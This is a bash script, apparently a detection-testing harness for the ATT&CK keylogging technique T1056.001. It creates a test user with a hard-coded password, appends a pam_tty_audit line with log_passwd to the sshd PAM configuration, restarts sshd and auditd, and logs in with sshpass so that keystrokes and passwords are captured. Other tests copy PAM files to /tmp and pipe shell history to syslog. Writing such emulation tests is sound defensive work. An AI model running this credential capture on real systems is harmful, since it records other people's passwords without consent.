#!/bin/bash

# Define the output directory and file
output_dir="Linux_output/Collection"
output_file="${output_dir}/T1056.001_Collection.txt"

# Create the output directory if it doesn't exist
mkdir -p "$output_dir"

# Check if the user 'testuser' exists, and create it if it doesn't
if ! id "testuser" &>/dev/null; then
    echo "Creating user 'testuser'..." | tee -a "$output_file"
    sudo adduser --disabled-password --gecos "" testuser | tee -a "$output_file"
    echo "Setting password for 'testuser'..." | tee -a "$output_file"
    echo "testuser:testpassword" | sudo chpasswd
    echo "'testuser' created and password set." | tee -a "$output_file"
else
    echo "'testuser' already exists." | tee -a "$output_file"
fi

# Function to run a test and log its output
run_test() {
    description="$1"
    command="$2"
    
    echo "Running test: $description" | tee -a "$output_file"
    eval "$command" | tee -a "$output_file"
    echo "Test $description completed." | tee -a "$output_file"
    echo "---------------------------------------------" | tee -a "$output_file"
}

# Tests

# Living off the land Terminal Input Capture on Linux with pam.d
run_test "Living off the land Terminal Input Capture on Linux with pam.d" "
cp -v /etc/pam.d/system-auth /tmp/ || echo 'File /etc/pam.d/system-auth not found'
"

# Logging bash history to syslog
run_test "Logging bash history to syslog" "
history -a >(tee -a ~/.bash_history | logger -t 'root[$$] $SSH_CONNECTION ')
"

# Logging sh history to syslog/messages
run_test "Logging sh history to syslog/messages" "
touch /root/.sh_history
logger 'file /root/.sh_history: No such file or directory'
tail -f /var/log/syslog | grep -i 'history' &
tail_pid=\$!
sleep 10
kill \$tail_pid
"

# Bash session based keylogger
run_test "Bash session based keylogger" "
echo 'Hello World!' | tee -a /tmp/.keyboard.log
cat /tmp/.keyboard.log
"

# SSHD PAM keylogger
run_test "SSHD PAM keylogger" "
cp -v /etc/pam.d/sshd /tmp/
echo 'session required pam_tty_audit.so disable=* enable=* open_only log_passwd' >> /etc/pam.d/sshd
systemctl restart sshd
systemctl restart auditd
echo 'testuser:testpassword' | sudo chpasswd
echo 'Password for testuser: testpassword'
sshpass -p 'testpassword' ssh -o StrictHostKeyChecking=no testuser@localhost 'whoami'
cp -v /tmp/sshd /etc/pam.d/sshd
"

# End of script
echo "All tests completed." | tee -a "$output_file"
